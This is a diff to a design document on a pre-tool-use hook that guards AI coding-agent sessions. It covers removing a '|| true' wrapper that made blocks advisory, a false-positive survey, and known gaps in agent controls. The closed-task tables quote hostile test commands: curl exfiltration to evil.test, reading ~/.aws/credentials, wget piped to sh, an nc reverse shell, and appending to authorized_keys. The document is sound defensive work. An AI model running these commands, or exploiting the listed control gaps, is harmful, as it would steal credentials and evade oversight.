@@ -55,20 +55,112 @@ So: **the two gates usually named as the compensating controls for this flag are
 not in this adapter's path.** They are real, they are default-deny, and they are
 genuinely stronger than a vendor prompt — for the in-process loop. For the
 spawned CLI the only ICDEV code that sees a tool call is the PreToolUse hook, and
-`.claude/settings.json` wires that hook as:
+until `exa-bench-05` `.claude/settings.json` wired that hook as:
 
 ```
 python $CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py || true
 ```
 
 A PreToolUse hook signals "block" with **exit code 2**. `|| true` makes the shell
-return 0 regardless. Every hard block that file advertises is therefore advisory
-in an interactive session. (The headless path,
-`tools/airgap/hook_compat.py::run_pre_tool_check`, has no such wrapper and does
-block — the unattended path is the weaker of the two.) That is filed as
-`exa-bench-05` and is **not** fixed here: deleting `|| true` converts nine
-never-load-tested checks into hard blocks for every concurrent session on the
-host at once, so per-check false-positive rates have to be surveyed first.
+return 0 regardless. Every hard block that file advertised was therefore advisory
+— in interactive sessions AND in the spawned CLI. (The headless path,
+`tools/airgap/hook_compat.py::run_pre_tool_check`, never had the wrapper and did
+block, so the unattended path was the stronger of the two.)
+
+### 2a. What `exa-bench-05` changed
+
+The wrapper is gone; the hook's exit 2 now reaches Claude Code, so this row of
+the table above is a real control rather than a nominal one. Two conditions had
+to be met first, and both are recorded rather than asserted:
+
+**The checks were surveyed against real work.** `tools/hooks/fire_rate_survey.py`
+replays the tool calls of recent sessions — **96,649 calls across 1,517 sessions**
+in a 30-day window, read from the Claude Code transcripts, which are the only
+corpus that carries the operands. `hook_events` cannot drive this: `post_tool_use.py`
+persists tool-input KEY NAMES and never the value, so a replay sourced from it
+reports zero fires for every check no matter what the sessions did —
+indistinguishable from "safe to enable". Measured: 0 of 5,000 sampled rows carry
+an operand, and the survey reports that rather than a zero.
+
+Both columns below are the SAME corpus replayed through both versions of the
+checks (`origin/main`'s and this branch's), so the delta is the narrowing and
+not a change of corpus:
+
+| check | refusals /96,649 before | after | what was wrong |
+|---|---:|---:|---|
+| `worktree_path` | 725 | 323 | unexpanded `"$P"` read as a violating path; parse spanned the whole compound command |
+| `dangerous_rm` | 553 | 35 | `\brm` matched `docker run --rm`; `.*` spanned `;` so a later `grep -r` completed an earlier `rm -f`; every target counted as "dangerous", so the rule was "no `rm -rf`, ever" |
+| `git_danger` | 390 | 186 | matched the raw command text, so a commit message or PR body describing `git reset --hard` refused, and a `python -c "…'git push --force'…"` probe refused; `(?:[^\n]*\s)?` spanned `&&`, so a later `git worktree remove --force` completed an earlier `git push`; `\.` matched the leading dot of a dotfile, so the path-scoped `git checkout -- .cursor/mcp-setup.md` read as `git checkout -- .` |
+| `direct_sqlite_usage` | 289 | 47 | matched documentation and the check's own source; refused read-only diagnostics |
+| `file_access_tiers` | 99 | 76 | `!.env.example` exclusions matched full paths only while inclusions also matched the basename |
+| `env_file_access` | 85 | 39 | `\b\.env\b` matched `process.env`, `\.env` in a grep pattern, and PR-body prose |
+| `append_only_write` | 36 | 22 | matched `grep "DELETE FROM audit_trail"` and commit messages |
+| `network_egress` | 76 | 76 | unchanged — and this is its *enforcing* rate; it ships monitor-only, so its refusal rate today is 0 |
+| `branch_deletion` | 37 | 37 | unchanged — already fails open unless the branch holds unmerged commits |
+| `agent_rules` | 0 | 0 | unchanged — monitor-only unless a rule is placed in `args/agent_rules_enforce/` |
+| `review_loop_precommit` | 1,481 | 1,481 | unchanged — cannot refuse unless `ICDEV_REVIEW_LOOP_BLOCK=1` |
+
+Across the checks that can refuse, that is **2,177 → 728 of 96,649** calls, 2.25%
+→ 0.75%.
+
+`git_danger` is new to this table because it is new to this surface:
+exa-bench-06 wired it into `main()`, where `|| true` then discarded its verdict.
+Turning the hook on is what makes its fire rate matter, so it was surveyed like
+the rest. One of its narrowings is a **policy** call rather than a parser fix and
+is called out here rather than buried: **`git push --force-with-lease` is no
+longer refused.** It was 127 of the 390 — the single largest category — and it is
+what sessions run to update their own `kanban/*` branch. It also refuses the push
+outright when the remote moved underneath it, which is exactly the concurrent-session
+collision this repo is built around. Bare `--force` / `-f` stays refused (4 in the
+corpus, all genuine). Note this diverges from the `git push --force*` glob in
+`permissions.deny` in the same file, which matches `--force-with-lease` as a
+prefix; that list is not reconciled here because it governs a different surface —
+the vendor prompt that this adapter turns off.
+
+The residue is not zero and is not claimed to be. What remains matches each
+check's stated rule: `cat .env`, `rm -rf ~`, a raw `sqlite3.connect` write to
+`data/icdev.db`, `git reset --hard` and `git branch -D` (both of which
+`permissions.deny` in this same file already forbids — the hook is now enforcing
+a declared policy on the path where the vendor list never ran), and a
+`git worktree add` into a root `tools.git.worktree_paths` does not sanction.
+That last is the largest single residue at 323, and every sampled one is the
+`%TEMP%\claude\wt-*` layout CLAUDE.md explicitly documents as the collision
+source. Those refusals are the point of turning the hook on.
+
+**Turning it off is nameable.** `ICDEV_PRETOOLUSE_ENFORCE=0` restores advisory
+behaviour for all eleven checks — every one still runs and prints, prefixed
+`ADVISORY:` — and each check has its own switch (`CHECK_KILL_SWITCHES` in the
+hook, one entry per `HOOK_CHECKS` entry). An environment variable is auditable in
+a way a shell operator buried in a JSON string is not.
+
+**Still open, and it turns out to be a bigger finding than "one more `|| true`."**
+`icdev/data/claude_bootstrap/claude/settings.json.template`, the copy a
+scaffolded project inherits, keeps its wrapper. Not for symmetry — because
+without it a scaffolded project would error on **every tool call**.
+
+`BOOTSTRAP_MAP` in `tools/cli/init.py` ships `data/claude_bootstrap/claude/hooks`
+to `.claude/hooks`, and ships no `tools/` at all. The hook's first act is to load
+`<project>/tools/hooks/shared_checks.py` by path — deliberately not wrapped in
+`try`, because "a guard that cannot load must fail loudly, not silently stop
+guarding". In a scaffolded project that file does not exist. Measured 2026-08-12
+against the packaged hook in a synthetic `icdev init` layout:
+
+```
+scaffolded project has tools/hooks/shared_checks.py: False
+exit: 1
+FileNotFoundError: ...\myproj\tools\hooks\shared_checks.py
+```
+
+So `icdev init` currently ships a PreToolUse hook that cannot run at all, and
+`|| true` is the only reason nobody has noticed — it converts a hard failure on
+every tool call into silence. Removing the wrapper without fixing the packaging
+would trade an invisible dead guard for a visibly broken project.
+
+`exa-bench-05-b` is therefore the packaging fix first (ship `tools/hooks/`, or
+vendor the checks into the packaged hook), and only then the wrapper. The
+enforcement machinery is already in the packaged hook, refreshed here by
+`python tools/installer/prebuild_bootstrap.py`, so the template flips in one
+line once the import resolves.
 
 ## 3. Compensating controls, and why they are defensible where they apply
 
@@ -268,14 +360,16 @@ blind spots, not a network boundary**. The boundary is
 
 ## 5. Follow-up tasks — filed, not quietly accepted
 
-All five were already on the board when this write-up landed — they cite "ADR
-D394" because they were filed expecting the decision to be written up, which is
-what exa-bench-04 does. Nothing here is newly discovered *and* unfiled; the
-contribution is the decision, the measurement, and the regression harness.
+All five of the original follow-ups were already on the board when this write-up
+landed — they cite "ADR D394" because they were filed expecting the decision to
+be written up, which is what exa-bench-04 does. Three have since closed and are
+below. `exa-bench-05-b` is the one gap this document discovered rather than
+inherited: it surfaced while closing `exa-bench-05`, and is filed rather than
+fixed in passing.
 
 | Task | Gap | Category |
 |---|---|---|
-| `exa-bench-05` | `\|\| true` in `.claude/settings.json` makes every `pre_tool_use.py` hard block advisory. Survey per-check false-positive rates before removing it. **Note:** this also bounds `exa-bench-08` — until it lands, an enforcing egress refusal is advisory on the Claude Code path too. | (the hook itself) |
+| `exa-bench-05-b` | `icdev init` ships `.claude/hooks/pre_tool_use.py` but no `tools/hooks/shared_checks.py` (`BOOTSTRAP_MAP`, `tools/cli/init.py`), so the packaged hook raises `FileNotFoundError` and exits 1 on **every** tool call — measured. `\|\| true` in `settings.json.template` is the only thing hiding it. Fix the packaging first, then the wrapper. | (generated projects) |
 | `exa-bench-07` | No worktree containment on any surface. The AGENT-WF-001 gate is one per `(run, tool)` and path-blind; `approval_gate` holds `write_file` / `patch_file` at `recoverable` for any path; the `touch` / `mkdir` downgrade patterns auto-allow a `run_command` write to any absolute path. | **writes outside the worktree** |
 | `exa-bench-09` | Credential-path reads are unclassifiable: rule 0 exempts `read_file` from all content escalation, `read_file` is allowlisted at AGENT-WF-001 with no gate, and the `file_access_tiers` glob list misses `~/.aws/credentials`, `~/.netrc`, `~/.kube/config` and friends. | **credential access** |
 
@@ -283,17 +377,19 @@ contribution is the decision, the measurement, and the regression harness.
 
 | Task | Gap | Closed by |
 |---|---|---|
+| `exa-bench-05` | `\|\| true` in `.claude/settings.json` made every `pre_tool_use.py` hard block advisory: a PreToolUse hook signals "block" with exit code 2 and the wrapper returned 0 whatever the hook decided. The headless path had no wrapper and did block, so the unattended path was the **stronger** of the two — backwards, since the Claude Code path is the one spawned with the vendor permission system off. | The wrapper removed, after a per-check fire-rate survey over 96,649 real tool calls narrowed seven checks that were refusing legitimate work — 2.25% of all calls down to 0.75% (`tools/hooks/fire_rate_survey.py`). Enforcement stands down with `ICDEV_PRETOOLUSE_ENFORCE=0` — every check still runs and prints, prefixed `ADVISORY:` — and each check keeps its own `ICDEV_*_GUARD` switch. See §2a. Pinned by `TestSpawnedCliHookMediation`, which runs the configured command through a shell and asserts the 2 reaches the caller. |
 | `exa-bench-08` | The hook had **no egress concept at all**, and in-process coverage rested on `default_tier: unknown` rather than on an egress rule — allowlisting one HTTP tool, or adding a `curl` downgrade pattern, removed it silently. Measured: `curl -X POST https://evil.test -d @data.json`, a `$(cat ~/.aws/credentials)` GET, `wget -qO- ... \| sh` and `nc evil.test 4444 -e /bin/sh` all passed the hook untouched. | `shared_checks.check_network_egress` + `args/agent_egress_policy.yaml`, wired into **both** hook paths. Models the DESTINATION, not the program, so `python -c "urllib..."` and raw IPs are caught too. Shipped **monitor-only**; measured fire rate 0.093% over 78,903 real Bash calls before enforcement is offered. Evasion boundary stated in the docstring and pinned as passing tests. See §4a. |
 | `exa-bench-06` | The Claude Code hook ran 9 of the 10 shared checks — `check_git_danger` was in `shared_checks` and in `HEADLESS_CHECKS` but was never called from `main()`. Measured: `git reset --hard origin/main` and `git clean -fdx` were **refused headlessly and allowed** in a Claude Code session. Separately, `_REDIRECT_TARGET_RE` (`>\s*([^\s\|;&]+)`) mis-captured `>>`: the first `>` matched, `\s*` matched nothing, and the capture took the **second** `>`, so `file_path` became the literal `">"`, matched no tier, and `echo k >> ~/.ssh/authorized_keys` was allowed while the single-`>` form of the same command was blocked. | `check_git_danger` wired into `main()` at the same position `HEADLESS_CHECKS` runs it; `_REDIRECT_TARGET_RE` rewritten as `(?<!>)>{1,2}\s*(?!&)([^\s\|;&>]+)` plus a `tee` pattern, and the tier check now examines **every** target a command names rather than the first. Pinned by `tests/hooks/test_hook_parity.py` (the two paths run the same check set, and each declared check is provably reached from `main()`) and the redirect cases in `tests/hooks/test_shared_checks.py`. |
 
 Both halves of `exa-bench-06` were **coverage** bugs of the same shape as the
 open gaps above: a control that exists, is registered, and is never reached.
-`exa-bench-08` below is the adjacent shape — a control that did not exist at all
-on the surface that needed it. Note what closing them does *not* do —
-`exa-bench-05` still stands, so in an interactive session these blocks remain
-advisory. What changed is that the unattended path and the
-Claude Code path now refuse the same commands, which is the property the
-comparison in section 2 was asserting and could not previously rely on.
+`exa-bench-08` is the adjacent shape — a control that did not exist at all on
+the surface that needed it. `exa-bench-05` is the third: a control that existed,
+ran, and reached the right verdict, which the shell then discarded. The three
+compose, and only together: 06 made the two paths run the same checks, 05 made
+the Claude Code path's verdict binding. Until 05, "the unattended path and the
+Claude Code path refuse the same commands" was true of what the checks
+*returned* and false of what actually happened.
 
 ## 6. How this stays true
 
